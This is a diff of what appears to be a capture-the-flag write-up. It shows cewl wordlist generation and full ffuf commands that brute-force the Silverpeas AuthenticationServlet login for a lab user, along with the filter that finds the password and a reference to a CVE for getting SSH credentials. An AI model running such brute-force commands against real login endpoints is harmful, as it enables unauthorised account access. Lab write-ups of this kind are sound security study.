@@ -234,11 +234,17 @@ After setting the cookie values on the browser console the same way as before, I
 
 1\. Generating a custom word list
 
+Note: Run against port **80** (Main website) instead of the Silverpeas application at port **8080**.
+
 ```bash
 $ cewl http://<target_machine_URL>:80 -w passwords.txt
 ```
 
 2\. Utilizing _**ffuf**_ to use the generated passwords word list to crack the password for the _**scr1ptkiddy**_ user.
+
+```bash
+$ ffuf ... -w <wordlist> -u http://<target-url>:8080/silverpeas/AuthenticationServlet -X POST -H "content-type:application/x-www-form-urlencoded" -d "Login=scr1ptkiddy&Password=FUZZ&DomainId=0"
+```
 
 A bulk of the responses from _**ffuf**_ appears to have the same status, size, words and lines (as shown from the output format). Thus,  I tried a few methods to possibly filter a positive response:
 
@@ -247,11 +253,10 @@ _**Match status codes 200-209**_
 `-mc 200,209`
 
 ```bash
-$ ffuf -mc 200,209 -w <wordlist> -u http://<target-url>:8080/silverpeas/AuthenticationServlet -X POST -H "content-type:application/x-www-form-urlencoded" -d "Login=scr1ptkiddy&Password=FUZZ&DomainId=0"
+$ ffuf -mc 200,209 ...
 ```
 
-This option does not work. It seems that a positive response also returns the same status code as the negative responses.
-
+This option does not work. It seems that a positive response also returns the same status code as the negative responses.\
 
 
 _**Filter regular expression patterns present in response**_
@@ -264,7 +269,7 @@ _Other possible options_
 
 `-fr "Login\?"` - Matches the pattern _Login?_, which is only present in the negative responses
 
-<pre class="language-bash"><code class="lang-bash"><strong>$ ffuf -w &#x3C;wordlist> -fr "ErrorCode" -u http://&#x3C;target-url>:8080/silverpeas/AuthenticationServlet -X POST -H "content-type:application/x-www-form-urlencoded" -d "Login=scr1ptkiddy&#x26;Password=FUZZ&#x26;DomainId=0"
+<pre class="language-bash"><code class="lang-bash"><strong>$ ffuf -fr "ErrorCode" ...
 </strong></code></pre>
 
 This option works to return a positive match for the password: `adipiscing`. Using the found password with the username scr1ptkiddy allows us to login to the dashboard. The method to retrieve the SSH credentials (refer to the details above - **CVE 2023-47323**) can be applied as the newly authenticated user.
